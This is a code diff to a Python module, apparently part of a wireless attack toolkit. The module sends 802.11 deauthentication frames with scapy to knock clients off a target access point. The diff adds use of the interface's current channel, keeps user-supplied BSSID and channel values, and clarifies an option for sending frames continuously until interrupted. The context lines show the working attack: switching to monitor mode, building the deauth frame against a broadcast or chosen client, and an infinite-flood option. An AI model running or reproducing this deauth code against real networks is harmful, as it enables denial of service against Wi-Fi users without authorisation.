@@ -3,6 +3,7 @@ import signal
 from time import sleep
 
 from pony.orm import *
+from pyric import pyw
 from scapy.all import sendp
 from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
 
@@ -28,11 +29,12 @@ class Module(BaseModule):
                                  metavar="INTERFACE")
     META["options"].add_argument("-b", "--bssid", help="BSSID of target AP")
     META["options"].add_argument("-s", "--ssid", help="SSID of target AP")
-    META["options"].add_argument("-c", "--channel", help="channel of target AP", type=int)
+    META["options"].add_argument("-c", "--channel", help="channel of target AP, if 0 or negative the WLAN interface "
+                                                         "(option --iface) current channel will be used.", type=int)
     META["options"].add_argument("--client", help="MAC of target client", default=BROADCAST_MAC)
     META["options"].add_argument("-n", "--num-frames",
-                                 help="number of deauth frames to send (multiplied by 64), 0 or negative means "
-                                      "infinite.",
+                                 help="number of deauth frames to send (multiplied by 64), if 0 or negative frames will"
+                                      " be sent continuously until ctrl-c is pressed.",
                                  default=1, type=int)
 
     def __init__(self):
@@ -50,8 +52,11 @@ class Module(BaseModule):
             bss = select_bss(cmd, args.ssid, args.bssid, args.client)
 
             if bss:
-                args.bssid = bss.bssid
-                args.channel = bss.channel
+                if not args.bssid:
+                    args.bssid = bss.bssid
+
+                if args.channel is None:
+                    args.channel = bss.channel
 
         if args.bssid is None:
             cmd.perror("BSSID is missing, and couldn't be obtained from the recon db.")
@@ -59,7 +64,12 @@ class Module(BaseModule):
             cmd.perror("Channel is missing, and couldn't be obtained from the recon db.")
         else:
             interface = set_monitor_mode(args.iface)
-            check_chset(interface, args.channel)
+
+            if args.channel > 0:
+                check_chset(interface, args.channel)
+            else:
+                args.channel = pyw.chget(interface)
+
             deauth_frame = RadioTap() / Dot11(addr1=args.client, addr2=args.bssid, addr3=args.bssid) / Dot11Deauth(
                 reason="class3-from-nonass")
             args.num_frames = "infinite" if args.num_frames <= 0 else args.num_frames * 64
